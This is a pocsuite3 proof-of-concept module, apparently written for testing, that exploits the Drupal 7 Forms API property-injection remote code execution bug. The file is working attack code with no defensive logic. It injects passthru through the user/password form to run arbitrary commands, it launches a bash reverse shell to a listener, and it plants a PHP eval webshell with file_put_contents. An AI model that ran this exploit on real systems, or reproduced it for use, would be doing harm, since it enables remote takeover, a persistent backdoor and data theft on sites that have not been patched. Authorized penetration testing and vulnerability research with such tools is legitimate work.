from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE, OptString, REVERSE_PAYLOAD 
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import json
import urllib
from bs4 import BeautifulSoup


class DemoPOC(POCBase):
    vulID = '97207'  # ssvid
    version = '1.0'
    author = ['wuerror']
    vulDate = '2018-03-08'
    createDate = '2021-03-31'
    updateDate = '2021-03-31'
    references = ['https://www.seebug.org/vuldb/ssvid-97207']
    name = 'Drupal core Remote Code Execution'
    appPowerLink = ''
    appName = 'Drupal'
    appVersion = '7.X'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''This module exploits a Drupal property injection in the Forms API. Drupal < 7.58 are vulnerable.'''
    samples = ["vulnhub machine Lampiao"]
    install_requires = ['bs4', 'lxml']
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    body_1 = {
            "_triggering_element_name": "name",
            "form_id": "user_pass"
        }

    def _options(self):
        cmd = OrderedDict()
        cmd["command"] = OptString("whoami", description='攻击时自定义命令')
        cmd["shell_content"] = OptString("<?php eval($_POST['pass']);?>", description="webshell内容")
        return cmd

    def get_form_id(self, text):
        soup = BeautifulSoup(text,'lxml')
        try:
            label = soup.select('input[name="form_build_id"]')[0]
            form_build_id = label["value"]
        except Exception as e:
            logger.error('without form_build_id')
            logger.error(e.args)
            form_build_id = None
        return form_build_id

    def _verify(self):
        result = {}
        flag = random_str(length=10)
        url1 = self.url.rstrip(
            '/') + "?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo {}".format(flag)
        res = requests.post(url1, data=self.body_1)
        form_build_id = self.get_form_id(res.text)
        if form_build_id is None:
            return result
        # get cmd response
        url2 = self.url.rstrip('/') + r"?q=file/ajax/name/%23default_value/{}".format(form_build_id)
        body_2 = {
            "form_build_id": form_build_id
        }
        res = requests.post(url2, data=body_2)
        try:
            if flag in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url1
                result['VerifyInfo']['Postdata'] = self.body_1
        except Exception as ex:
            logger.error(str(ex))
        
        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        if cmd == "ws":
            res = self.write_shell()
            return res
        cmd = urllib.parse.quote(cmd)
        url1 = self.url.rstrip(
            '/') + "?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={}".format(cmd)
        res = requests.post(url1, data=self.body_1)
        form_build_id = self.get_form_id(res.text)
        if form_build_id is None:
            return result
        # get cmd response
        url2 = self.url.rstrip('/') + r"?q=file/ajax/name/%23default_value/{}".format(form_build_id)
        body_2 = {
            "form_build_id": form_build_id
        }
        res = requests.post(url2, data=body_2)
        # 未清洗返回数据
        if res.status_code == 200:
            cmd_output = res.text
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['extra'] = {}
            result['extra']['cmd_output'] = cmd_output
        return self.parse_output(result)

    def _shell(self):
        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        cmd = urllib.parse.quote(cmd)
        url1 = self.url.rstrip(
            '/') + "?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={}".format(cmd)
        res = requests.post(url1, data=self.body_1)
        form_build_id = self.get_form_id(res.text)
        if form_build_id is None:
            return None
        # get cmd response
        url2 = self.url.rstrip('/') + r"?q=file/ajax/name/%23default_value/{}".format(form_build_id)
        body_2 = {
            "form_build_id": form_build_id
        }
        res = requests.post(url2, data=body_2)


    def write_shell(self):
        # 写入webshell
        result = {}
        path = random_str(length=4)
        shell_content = urllib.parse.quote(self.get_option("shell_content"))
        url1 = self.url.rstrip(
            '/') + r"?q=user/password&name[%23attached][file_put_contents][0][0]={filename}.php&name[%23attached][file_put_contents][0][1]={xiaoma}".format(filename=path,xiaoma=shell_content)
        res = requests.post(url1, data=self.body_1)
        form_build_id = self.get_form_id(res.text)
        if form_build_id is None:
            return result
        url2 = self.url.rstrip('/') + r"?q=file/ajax/name/%23default_value/{}".format(form_build_id)
        body_2 = {
            "form_build_id": form_build_id
        }
        res = requests.post(url2, data=body_2)
        if res.status_code == 200:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = self.url + path + '.php'
            result['ShellInfo']['Content'] = self.get_option("shell_content")
        return self.parse_output(result)

        
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)
